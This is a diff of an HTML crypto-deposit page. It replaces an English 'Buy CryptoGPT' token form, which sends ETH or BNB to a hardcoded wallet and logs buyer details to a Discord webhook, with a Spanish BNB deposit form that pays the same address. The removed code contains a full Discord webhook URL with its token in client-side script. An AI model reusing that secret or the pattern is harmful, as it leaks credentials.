@@ -1,95 +1,79 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Buy CryptoGPT</title>
-  </head>
-  <body>
-    <h1>Buy CryptoGPT</h1>
+<head>
+  <meta charset="UTF-8">
+  <title>Depositar Ethereum y BNB con Metamask</title>
+</head>
+<body>
+  <h1>Depositar Ethereum y BNB con Metamask</h1>
 
-    <form onsubmit="sendTransaction(event)">
-      <label for="depositAmount">Enter amount of ETH or BNB to deposit:</label>
-      <input type="number" step="any" name="depositAmount" id="depositAmount" required>
+  <label for="amount">Cantidad de BNB:</label>
+  <input type="text" id="amount" placeholder="Ingresa la cantidad de BNB"><br><br>
 
-      <label for="network">Select network:</label>
-      <select name="network" id="network">
-        <option value="eth">Ethereum</option>
-        <option value="bsc">Binance Smart Chain</option>
-      </select>
+  <button onclick="deposit()">Depositar Ethereum y BNB</button>
 
-      <p>Estimated amount of GPT to receive:</p>
-      <p id="gptAmount"></p>
+  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+  <script>
+    // Conecta con la billetera de Metamask
+    if (typeof window.ethereum !== 'undefined') {
+      var web3 = new Web3(window.ethereum);
 
-      <button type="submit">Buy Tokens</button>
-    </form>
+      ethereum.request({ method: 'eth_requestAccounts' }).then(function(accounts) {
+        // Obtiene la dirección de la cuenta de Metamask
+        var account = accounts[0];
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
-    <script>
-      async function sendTransaction(event) {
-        event.preventDefault();
+        // Muestra la dirección de la cuenta en la página
+        var addressElement = document.createElement("p");
+        addressElement.innerHTML = "Tu dirección de Ethereum es: " + account;
+        document.body.appendChild(addressElement);
+      }).catch(function(error) {
+        alert("Debes conectarte a Metamask para realizar esta transacción.");
+      });
+    } else {
+      alert("Debes tener Metamask instalado para realizar esta transacción.");
+    }
 
-        const depositAmount = document.getElementById("depositAmount").value;
-        const network = document.getElementById("network").value;
+    function deposit() {
+      // Obtiene la cantidad de BNB que el usuario desea enviar
+      var bnbAmount = document.getElementById("amount").value;
 
-        let gptAmount;
-        if (network === "eth") {
-          gptAmount = depositAmount * 320000;
-        } else {
-          gptAmount = depositAmount * 60000;
-        }
-
-        document.getElementById("gptAmount").textContent = gptAmount;
-
-        try {
-          const provider = await connectToMetamask();
-          const accounts = await provider.request({ method: "eth_requestAccounts" });
-          const from = accounts[0];
-          const chainId = network === "eth" ? "0x1" : "0x38";
-          const tx = {
-            from,
-            to: "0x8935361d21943Ee8a863082EdD8a6Aefb062E434", // la dirección de depósito aquí
-            value: web3.utils.toWei(depositAmount, "ether"),
-            chainId,
-          };
-          const txHash = await provider.request({ method: "eth_sendTransaction", params: [tx] });
-
-          // enviar información de transacción a webhook de Discord
-          await sendDiscordWebhook(`Wallet: ${from}, Deposit: ${depositAmount}, TxHash: ${txHash}`);
-        } catch (error) {
-          console.error(error);
-        }
+      // Verifica que el usuario haya ingresado una cantidad válida
+      if (isNaN(bnbAmount) || bnbAmount <= 0) {
+        alert("Debes ingresar una cantidad válida de BNB.");
+        return;
       }
 
-      async function connectToMetamask() {
-        if (window.ethereum) {
-          await window.ethereum.request({ method: "eth_requestAccounts" });
-          return window.ethereum;
-        } else {
-          throw new Error("Metamask not found");
-        }
-      }
+      // Conecta con la billetera de Metamask
+      if (typeof window.ethereum !== 'undefined') {
+        ethereum.request({ method: 'eth_requestAccounts' }).then(function(accounts) {
+          // Obtiene la dirección de la cuenta de Metamask
+          var account = accounts[0];
 
-      async function sendDiscordWebhook(message) {
-        const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-"; // su URL de webhook aquí
-        const data = { content: message };
-        const response = await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-		  body: JSON.stringify(data),
+          // Convierte la cantidad de BNB a wei
+          var weiAmount = web3.utils.toWei(bnbAmount.toString(), 'ether');
+
+          // Envía la transacción al contrato inteligente
+          web3.eth.sendTransaction({
+            to: '0x8935361d21943Ee8a863082EdD8a6Aefb062E434', // Dirección de tu contrato inteligente
+            from: account,
+            value: weiAmount
+          }, function(err, txHash) {
+            if (err) {
+              alert("Se produjo un error al enviar la transacción: " + err);
+            } else {
+              alert("La transacción se ha enviado correctamente: " + txHash);
+            }
+          });
+        }).catch(function(error) {
+          alert("Debes conectarte a Metamask para realizar esta transacción.");
         });
-        return response;
+      } else {
+        alert("Debes tener Metamask instalado para realizar esta transacción.");
       }
-
-      connectButton.addEventListener("click", connectToMetamask);
-      depositButton.addEventListener("click", depositTokens);
-    </script>
-  </body>
+    }
+  </script>
+</body>
 </html>
-         
-
-</html>
-
 
 
 <!doctype html>
